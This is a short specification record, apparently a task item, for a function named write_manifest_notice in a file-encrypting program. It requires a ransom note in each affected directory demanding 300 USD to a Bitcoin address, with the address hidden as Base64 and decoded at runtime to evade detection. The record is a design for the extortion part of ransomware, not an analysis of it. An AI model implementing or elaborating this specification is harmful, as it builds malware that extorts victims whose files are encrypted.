description: In each directory where at least one file was transformed, create a file named #_STATUS_NOTICE_#.txt. The content instructs the recipient to send 300 USD to the payment address "1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa" and to initiate contact via a secure channel. The payment address is stored as a Base64-encoded char array in the source code and decoded at runtime by a custom base64_decode() function implemented within this module.
name: write_manifest_notice
